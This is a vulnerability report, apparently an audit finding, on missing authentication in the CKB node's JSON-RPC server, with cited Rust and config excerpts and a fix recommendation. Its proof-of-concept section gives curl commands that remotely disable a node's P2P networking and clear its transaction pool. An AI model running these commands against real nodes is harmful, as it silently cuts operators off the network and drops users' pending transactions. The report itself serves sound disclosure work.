### Title
`set_network_active` RPC Has No Access Control — Any Unauthenticated RPC Caller Can Disable All P2P Network Activity - (File: rpc/src/module/net.rs)

---

### Summary

The CKB RPC server has no authentication mechanism whatsoever. The `set_network_active` RPC method, which is intended to be an operator-only administrative control, performs no caller identity check before toggling the node's entire P2P networking layer on or off. Any caller who can reach the RPC endpoint — including any process on the same host or any remote client if the operator has exposed the port — can silently isolate the node from the entire P2P network with a single HTTP POST.

---

### Finding Description

**Root cause — no authentication in the RPC server:**

The `RpcConfig` struct defines every configurable aspect of the RPC server and contains no authentication field of any kind — no token, no password, no HMAC secret, no IP allowlist. [1](#0-0) 

The `ServiceBuilder` wires all RPC modules into a plain `IoHandler` with no authentication middleware layer. [2](#0-1) 

**Vulnerable function — `set_network_active`:**

The implementation of `set_network_active` in `NetRpcImpl` calls `network_controller.set_active(state)` directly, with zero caller verification: [3](#0-2) 

`NetworkController::set_active` stores the boolean atomically and the `CKBHandler` protocol dispatcher immediately honours it, dropping all subsequent received messages when `false`: [4](#0-3) [5](#0-4) 

**The Net module is enabled by default:** [6](#0-5) 

**The RPC listen address is operator-configurable:**

The default is `127.0.0.1:8114`, but the config accepts any address. Operators routinely change this to `0.0.0.0:8114` for remote management. The documentation warns against it but provides no enforcement mechanism. [7](#0-6) 

**Secondary affected methods (same root cause, same module):**

`clear_tx_pool` and `clear_tx_verify_queue` in the Pool module are equally unprotected and can be used to evict all pending user transactions: [8](#0-7) 

---

### Impact Explanation

An attacker who reaches the RPC endpoint sends one unauthenticated HTTP POST:

```
{"jsonrpc":"2.0","method":"set_network_active","params":[false],"id":1}
```

Effect: `network_state.active` is set to `false`. Every subsequent inbound P2P message is silently discarded by `CKBHandler::received`. The node stops syncing blocks, stops relaying transactions, and stops responding to peer discovery. The node appears alive locally but is completely isolated from the network. The condition persists until the operator manually calls `set_network_active(true)` — which they may not notice for an extended period.

A second call with `clear_tx_pool` additionally evicts all pending transactions, causing user funds to be stuck until resubmission.

---

### Likelihood Explanation

- The Net and Pool RPC modules are enabled in the default production configuration.
- No authentication credential is required; the attack is a single unauthenticated HTTP POST.
- Operators who expose the RPC port for remote management (a common operational pattern) are directly reachable by any internet attacker.
- Even with the default localhost binding, any co-resident process (e.g., a compromised dApp backend, a malicious npm package in a co-located service) can reach the endpoint without any privilege escalation.

---

### Recommendation

Add an optional `auth_token` field to `RpcConfig`. In the HTTP handler, reject any request whose `Authorization: Bearer <token>` header does not match the configured value before dispatching to any method. At minimum, gate the state-mutating methods (`set_network_active`, `clear_tx_pool`, `clear_tx_verify_queue`, `set_ban`, `clear_banned_addresses`, `remove_transaction`) behind this check. The miner client already demonstrates the pattern of embedding credentials in the RPC URL and sending an `Authorization` header. [9](#0-8) 

---

### Proof of Concept

**Precondition:** operator has set `listen_address = "0.0.0.0:8114"` (or attacker is co-resident on the host).

**Step 1 — Disable all P2P networking:**
```bash
curl -s -X POST http://<node-ip>:8114 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"set_network_active","params":[false],"id":1}'
# Returns: {"jsonrpc":"2.0","result":null,"id":1}
```

**Step 2 — Confirm isolation:**
```bash
curl -s -X POST http://<node-ip>:8114 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"get_peers","params":[],"id":2}'
# Peer count stops growing; sync halts; block tip freezes
```

**Step 3 (optional) — Evict all pending transactions:**
```bash
curl -s -X POST http://<node-ip>:8114 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":3}'
# Returns: {"jsonrpc":"2.0","result":null,"id":3}
```

**Expected outcome:** The node is silently isolated from the P2P network. Block synchronisation stops. All pending user transactions are dropped. No error is logged that would alert the operator. The attack is reversible only by the operator calling `set_network_active(true)`, which they may not do if they are unaware of the attack.

### Citations

**File:** util/app-config/src/configs/rpc.rs (L24-61)
```rust
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize, Eq)]
#[serde(deny_unknown_fields)]
pub struct Config {
    /// RPC server listen addresses.
    pub listen_address: String,
    /// RPC TCP server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub tcp_listen_address: Option<String>,
    /// RPC WS server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub ws_listen_address: Option<String>,
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
    /// Number of RPC worker threads.
    pub threads: Option<usize>,
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
    /// Enabled RPC modules.
    pub modules: Vec<Module>,
    /// Rejects txs with scripts that might trigger known bugs
    #[serde(default)]
    pub reject_ill_transactions: bool,
    /// Whether enable deprecated RPC methods.
    ///
    /// Deprecated RPC methods are disabled by default.
    #[serde(default)]
    pub enable_deprecated_rpc: bool,
    /// Customized extra well known lock scripts.
    #[serde(default)]
    pub extra_well_known_lock_scripts: Vec<Script>,
    /// Customized extra well known type scripts.
    #[serde(default)]
    pub extra_well_known_type_scripts: Vec<Script>,
}
```

**File:** rpc/src/service_builder.rs (L36-47)
```rust
macro_rules! set_rpc_module_methods {
    ($self:ident, $name:expr, $check:ident, $add_methods:ident, $methods:expr) => {{
        let mut meta_io = MetaIoHandler::default();
        $add_methods(&mut meta_io, $methods);
        if $self.config.$check() {
            $self.add_methods(meta_io);
        } else {
            $self.update_disabled_methods($name, meta_io);
        }
        $self
    }};
}
```

**File:** rpc/src/module/net.rs (L772-775)
```rust
    fn set_network_active(&self, state: bool) -> Result<()> {
        self.network_controller.set_active(state);
        Ok(())
    }
```

**File:** network/src/network.rs (L1588-1591)
```rust
    /// Change active status, if set false discard any received messages
    pub fn set_active(&self, active: bool) {
        self.network_state.active.store(active, Ordering::Release);
    }
```

**File:** network/src/protocols/mod.rs (L365-368)
```rust
    async fn received(&mut self, context: ProtocolContextMutRef<'_>, data: Bytes) {
        if !self.network_state.is_active() {
            return;
        }
```

**File:** resource/ckb.toml (L177-184)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}
```

**File:** resource/ckb.toml (L190-190)
```text
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
```

**File:** rpc/src/module/pool.rs (L684-700)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }

    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
```

**File:** miner/src/client.rs (L380-393)
```rust
fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
```
